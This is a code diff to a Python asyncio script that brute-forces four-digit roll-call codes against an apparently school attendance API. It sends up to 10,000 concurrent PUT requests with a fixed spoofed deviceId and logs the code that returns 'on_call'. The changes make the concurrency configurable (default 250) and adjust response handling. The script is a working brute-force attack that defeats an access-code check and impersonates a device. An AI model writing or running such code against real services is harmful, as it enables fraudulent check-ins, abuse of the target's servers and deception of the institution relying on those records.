@@ -3,6 +3,7 @@ import aiohttp
 import asyncio
 import json
 import logging
+import os
 
 from schools.http_headers import number_rollcall_headers
 
@@ -14,16 +15,16 @@ if not logging.getLogger().hasHandlers():
 logger = logging.getLogger(__name__)
 
 MAX_NUMBER_CODE = 10_000
-DEFAULT_CONCURRENCY = 250
+DEFAULT_CONCURRENCY = int(os.getenv("CONCURRENCY", "250"))
 
 
 async def try_code(session, url, headers, code):
     data = {"deviceId": "7eba2081f77e5527", "numberCode": code}
     async with session.put(url, headers=headers, data=json.dumps(data)) as resp:
-        text = await resp.text()
-        logger.debug("Trying %s: %s - %s", code, resp.status, text)
-        if resp.status == 200 and "on_call" in text.lower():
-            logger.info("✅ Correct code found: %s", code)
+        body = await resp.read()
+        logger.debug("Trying %s: %s", code, resp.status)
+        if resp.status == 200 and b"on_call" in body:
+            logger.info("Correct code found: %s", code)
             return True
     return False
 
